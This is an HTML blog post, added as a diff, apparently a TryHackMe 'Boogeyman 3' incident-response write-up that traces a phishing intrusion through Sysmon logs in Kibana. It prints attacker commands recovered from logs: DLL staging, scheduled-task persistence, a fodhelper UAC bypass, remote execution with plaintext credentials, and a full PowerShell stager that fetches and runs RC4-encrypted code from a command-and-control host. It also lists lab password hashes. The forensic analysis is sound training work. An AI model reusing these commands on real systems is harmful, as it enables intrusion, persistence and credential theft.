@@ -1,0 +1,125 @@
+<!doctype html><html lang=en-us><head><title>Boogeyman 3 | alfa7i7</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=generator content="Hugo 0.148.0"><link rel=canonical href=/side-quests/thm-boogeyman-3/><link href=/css/style.min.041e4a3e04c8d069c51f822569eabf716b17b3aec0c9052ef93405591a10b665.css rel=stylesheet><script src=https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js></script><script>mermaid.initialize({startOnLoad:!0})</script></head><body><div class=flexWrapper><header class=headerWrapper><div class=header><div><a class=terminal href=/><span>alfa7i7@empire ~ $</span></a></div><input class=side-menu type=checkbox id=side-menu>
+<label class=hamb for=side-menu><span class=hamb-line></span></label><nav class=headerLinks><ul><li><a href=/posts title>~/blog</a></li><li><a href=/side-quests title>~/side-quests</a></li><li><a href=/whoami title>~/whoami</a></li></ul></nav></div></header><div class=content><main class=main><div class=postWrapper><h1>Boogeyman 3</h1><section class=postMetadata><dl><dt>tags</dt><dd><span></span>
+<a href=/tags/dfir/>#DFIR</a><span></span>
+<a href=/tags/phishing/>#Phishing</a><span></span>
+<a href=/tags/sysmon/>#Sysmon</a><span></span>
+<a href=/tags/elk/>#ELK</a><span></span>
+<a href=/tags/kibana/>#Kibana</a></dd><dt>categories</dt><dd><span></span>
+<a href=/categories/tryhackme/>TryHackMe</a><span></span>
+<a href=/categories/soc-1/>SOC 1</a></dd><dt>published</dt><dd><time datetime=2024-11-07>November 7, 2024</time></dd><dt>reading time</dt><dd>6 minutes</dd></dl></section><div><p><img src=boogeybanner.png alt=banner></p><blockquote><p>Due to the previous attacks of Boogeyman, Quick Logistics LLC hired a managed
+security service provider to handle its Security Operations Center. Little did
+they know, the Boogeyman was still lurking and waiting for the right moment to
+return&mldr;</p></blockquote><p>Story time:</p><blockquote><p>Without tripping any security defences of Quick Logistics LLC, the Boogeyman
+was able to compromise one of the employees and stayed in the dark, waiting
+for the right moment to continue the attack. Using this initial email access,
+the threat actors attempted to expand the impact by targeting the CEO, Evan
+Hutchinson.
+The email appeared questionable, but Evan still opened the attachment despite
+the scepticism. After opening the attached document and seeing that nothing
+happened, Evan reported the phishing email to the security team.</p><p>Upon receiving the phishing email report, the security team investigated the
+workstation of the CEO. During this activity, the team discovered the email
+attachment in the downloads folder of the victim. In addition, the security
+team also observed a file inside the ISO payload</p><p>Lastly, it was presumed by the security team that the incident occurred
+between August 29 and August 30, 2023. Given the initial findings, you are
+tasked to analyse and assess the impact of the compromise.</p></blockquote><p>Phishing artefacts:</p><p><img src=phishmail.png alt=whalmail></p><p><img src=iso.png alt="malicious file"></p><p><img src=htmlpayload.png alt="hta payload"></p><p>In this investigation we will be leveraging Kibana to assess the impact of the
+recent Boogeyman&rsquo;s attack.</p><p>Once in the home page, head over to Discover tab under Kibana Analytics section
+and make sure to select the right time periode of the incident.</p><p><img src=image.png alt="selecting the scope"></p><p><img src=image-1.png alt="selecting the scope 2"></p><p>Our investigation will be based on events recorded with Sysmon. We will focus
+first on executed/created processes (Sysmon EventId 1) and see what we can find
+out.</p><p>The first process we see is already very promising. It is most likely to
+be a ransomware, based on its name <code>ransomboogey.exe</code>:</p><p><img src=image-2.png alt=ransomboogey.exe></p><p>Good, but let&rsquo;s not get ahead of ourselves and start from the actual beginning
+(newest events are displayed on the top). Viewing events in chronological
+order (oldest first) and querying for events with the keyword &ldquo;Financial&rdquo; as in
+name of the malicious attachment shows us 4 events. The first one refers to
+the execution of <code>mshta.exe</code> (PID 6392) spawned by <code>explorer.exe</code>, and the rest
+of the events are child processes of <code>mshta.exe</code>:</p><p><img src=image-3.png alt="looking up financial in logs"></p><p><code>mshta.exe</code> is a utility that executes Microsoft HTML Application (HTA) files,
+this corresponds to the malicious file filetype masquerading as PDF. The
+execution of this first stage of the payload resulted in:</p><ol><li>(PID 6204) Implanting the file <code>review.dat</code> from the mounted drive into the CEO user space:</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>C:\Windows\System32\xcopy.exe /s /i /e /h D:\review.dat C:\Users\EVAN~<span style=color:#ae81ff>1</span>.HUT\AppData\Local\Temp\review.dat
+</span></span></code></pre></div><ol start=2><li>(PID 3832) Executing a DLL function from the implanted <code>.dat</code> rogue file
+(which is actually a DLL):</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>C:\Windows\System32\rundll32.exe D:\review.dat,DllRegisterServer
+</span></span></code></pre></div><ol start=3><li>(PID 3680) Establishing persistence via the new scheduled task named Review:</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#e6db74>&#34;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#34;</span> $A = New-ScheduledTaskAction -Execute <span style=color:#e6db74>&#39;rundll32.exe&#39;</span> -Argument <span style=color:#e6db74>&#39;C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat,DllRegisterServer&#39;</span>; $T = New-ScheduledTaskTrigger -Daily -At <span style=color:#ae81ff>06</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>00</span>; $S = New-ScheduledTaskSettingsSet; $P = New-ScheduledTaskPrincipal $env:username; $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S; Register-ScheduledTask Review -InputObject $D -Force;
+</span></span></code></pre></div><p>Continuing our investigation by following the traces of step 2 (PID 3832), the
+screenshot below lists other processes called upon execution of that process.
+The list of the executed commands is listed right under:</p><p><img src=image-5.png alt="child processes of 3832"></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>C:\Windows\system32\cmd.exe /c <span style=color:#e6db74>&#34;whoami /all&#34;</span>
+</span></span><span style=display:flex><span>C:\Windows\system32\net.exe users
+</span></span><span style=display:flex><span>C:\Windows\system32\net.exe localgroup administrators
+</span></span><span style=display:flex><span>C:\Windows\system32\whoami.exe /groups
+</span></span><span style=display:flex><span>C:\Windows\system32\fodhelper.exe
+</span></span><span style=display:flex><span>C:\Windows\System32\WindowsPowerShell\v1.<span style=color:#ae81ff>0</span>\powershell.exe -c <span style=color:#e6db74>&#34;</span>$credential<span style=color:#e6db74> = (New-Object PSCredential -ArgumentList (&#39;QUICKLOGISTICS\allan.smith&#39;, (ConvertTo-SecureString &#39;Tr!ckyP@ssw0rd987&#39; -AsPlainText -Force))) ; Invoke-Command -Credential </span>$credential<span style=color:#e6db74> -ComputerName WKSTN-1327 -ScriptBlock {powershell -enc SQBmACgAJAB...SNIP...kAKQB8AEkARQBYAA==}&#34;</span>
+</span></span></code></pre></div><p>Commands from line 1 to 4 enumerate system information, gathering info
+about users and groups especially administrators. The command in line 5, since
+it was executed by the malicious document, uses a common exploitation of
+<code>fodhelper.exe</code> to bypass UAC. As a quick refresher, User Account
+Control is a mechanism to safeguard privilege elevation, in simple terms
+validating a user (in this case an admin) has the right to execute high-privilege
+actions. <code>fodhelper.exe</code> on the other hand is a legitimate Windows executable
+associated with managing optional Windows features. It runs with elevated
+privileges, which makes it a target for exploitation.</p><p>Boogeyman downloaded a tool from Github to dump credentials. Looking for Github
+access, we find the tool being used. Should have guessed it, mimikatz.</p><p><img src=image-6.png alt="github access"></p><p>What credentials were accessed by the Boogey? Let&rsquo;s see. Filtering for mimikatz,
+on machine WKST-0051, we notice that the adversary uses the module <code>sekurlsa</code> to
+impersonate users by providing only the hashes of their passwords (Pass The i
+Hash), the case in the following capture with <code>itadmin:F84769D250EB95EB2D7D8B4A1C5613F2</code>.</p><p><img src=image-copy.png alt="spawn powershell.exe as Administrator"></p><p>How the attacker found the credentials of <code>allan.smith</code>?
+Following the Github access logs, we find that Boogey downloaded <code>PowerView.ps1</code>
+to perform a more comprehensive enumeration of the environment.
+They found an automation script <code>IT_Automation.ps1</code> in one of the file share,
+which happen to have hardcoded credentials of Allan.</p><p><img src=image-5-copy.png alt="downloading powerview"></p><p><img src=image-4-copy.png alt="accessing ITFiles share"></p><p>Back to <code>review.dat</code> DLL.
+The last command on the list tries to execute, remotely on machine <code>WKSTN-1327</code>,
+an encoded PowerShell script block as the user <code>allan.smith</code>. Below is the
+content of that script. Note, the server value is decoded to
+<code>http://cdn.bananapeelparty.net:80</code>. As far as we can understand from the script,
+this establishes an RC4-encrypted C2 channel with the previously mentionned server:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#66d9ef>If</span> ($PSVersionTable.PSVersion.Major <span style=color:#f92672>-ge</span> <span style=color:#ae81ff>3</span>) {}
+</span></span><span style=display:flex><span>[<span style=color:#66d9ef>System.Net.ServicePointManager</span>]::Expect100Continue = <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$wc = New-Object System.Net.WebClient
+</span></span><span style=display:flex><span>$userAgent = <span style=color:#e6db74>&#39;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&#39;</span>
+</span></span><span style=display:flex><span>$wc.Headers.Add(<span style=color:#e6db74>&#39;User-Agent&#39;</span>, $userAgent)
+</span></span><span style=display:flex><span>$server = [<span style=color:#66d9ef>Text.Encoding</span>]::Unicode.GetString([<span style=color:#66d9ef>Convert</span>]::FromBase64String(
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;aAB0AHQAcAA6AC8ALwBjAGQAbgAuAGIAYQBuAGEAbgBhAHAAZQBlAGwAcABhAHIAdAB5AC4AbgBlAHQAOgA4ADAA&#39;</span>
+</span></span><span style=display:flex><span>))
+</span></span><span style=display:flex><span>$path = <span style=color:#e6db74>&#39;/admin/get.php&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$wc.Proxy = [<span style=color:#66d9ef>System.Net.WebRequest</span>]::DefaultWebProxy
+</span></span><span style=display:flex><span>$wc.Proxy.Credentials = [<span style=color:#66d9ef>System.Net.CredentialCache</span>]::DefaultNetworkCredentials
+</span></span><span style=display:flex><span>$Script:Proxy = $wc.Proxy
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$key = [<span style=color:#66d9ef>System.Text.Encoding</span>]::ASCII.GetBytes(<span style=color:#e6db74>&#39;}wS1&amp;VNqoIY*G#5-Plv{p2f=4Z?uat@&lt;&#39;</span>)
+</span></span><span style=display:flex><span>$RC4 = {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>param</span> ($data, $key)
+</span></span><span style=display:flex><span>    $S = <span style=color:#ae81ff>0</span>.<span style=color:#ae81ff>.255</span>
+</span></span><span style=display:flex><span>    $j = <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> ($i = <span style=color:#ae81ff>0</span>; $i <span style=color:#f92672>-lt</span> <span style=color:#ae81ff>256</span>; $i++) {
+</span></span><span style=display:flex><span>        $j = ($j + $S[$i] + $key[$i % $key.Length]) % <span style=color:#ae81ff>256</span>
+</span></span><span style=display:flex><span>        $S[$i], $S[$j] = $S[$j], $S[$i]
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    $i = <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>    $j = <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>    $data | ForEach-Object {
+</span></span><span style=display:flex><span>        $i = ($i + <span style=color:#ae81ff>1</span>) % <span style=color:#ae81ff>256</span>
+</span></span><span style=display:flex><span>        $j = ($j + $S[$i]) % <span style=color:#ae81ff>256</span>
+</span></span><span style=display:flex><span>        $S[$i], $S[$j] = $S[$j], $S[$i]
+</span></span><span style=display:flex><span>        $_ <span style=color:#f92672>-bxor</span> $S[($S[$i] + $S[$j]) % <span style=color:#ae81ff>256</span>]
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$wc.Headers.Add(<span style=color:#e6db74>&#34;Cookie&#34;</span>, <span style=color:#e6db74>&#34;rlkHVXWbb=13cfco9rUXx0i4J3xTu682JFiX0=&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$data = $wc.DownloadData($server + $path)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$iv = $data[<span style=color:#ae81ff>0</span>.<span style=color:#ae81ff>.3</span>]
+</span></span><span style=display:flex><span>$data = $data[<span style=color:#ae81ff>4</span>..$data.Length]
+</span></span><span style=display:flex><span>-join [<span style=color:#66d9ef>Char[]</span>](&amp; $RC4 $data ($iv + $key)) | Invoke-Expression
+</span></span></code></pre></div><p>Based on the gathered info so far, we can trace connections to the C2 server.
+Filtering for network events (Sysmon EventId 3) and connections over port 80,
+there is only one IP address responsible for all the traffic;
+165.232.170.151. Hence, it must be the C2 address.</p><p><img src=image-4.png alt="c2 server ip address"></p><p>The lateral movement command was executed at <code>2023-08-30 01:40:37.178</code>. Based on
+that timestamp, checking <code>allan.smith</code>&rsquo;s activity on <code>WKSTN-1327</code> indicates that
+the parent process is <code>wsmprovhost.exe</code>.</p><p><img src=image-1-copy.png alt="laterla movement"></p><p>On the second machine, Boogeyman used the same procedure to dump credentials.
+Hence the same trick will show us the accessed credentials of the administrator:
+<code>administrator:00f80f2538dcb54e7adc715c0e7091ec</code>.</p><p>Boogey leveraged <code>mimikatz</code> again to conduct a DCSync attack using <code>backupda</code>
+account. The evidences left shows this access:</p><p><img src=image-2-copy.png alt="dcsync with mimikatz"></p><p>Now, remember <code>ransomboogey</code> from the very beginning? The last piece of the
+puzzle is to identify where it was downloaded from. This info is easily
+accessible with a simple search for ransomboogey:
+<code>http://ff.sillytechninja.io/ransomboogey.exe</code>.</p><p><img src=image-3-copy.png alt="ransomboogey origin"></p><p>It is legitimate to hope the Boogeyman does not come back again. But this is
+an uncontrollable factor. What is controllable however, is to level up the
+company&rsquo;s security posture.</p></div></div></main></div><footer class=footer><span>© 2025 alfa7i7, Built with
+<a href=https://gohugo.io class=footerLink>Hugo</a> and
+<a href=https://github.com/LordMathis/hugo-theme-nightfall class=footerLink>Nightfall</a> theme</span></footer></div></body></html>
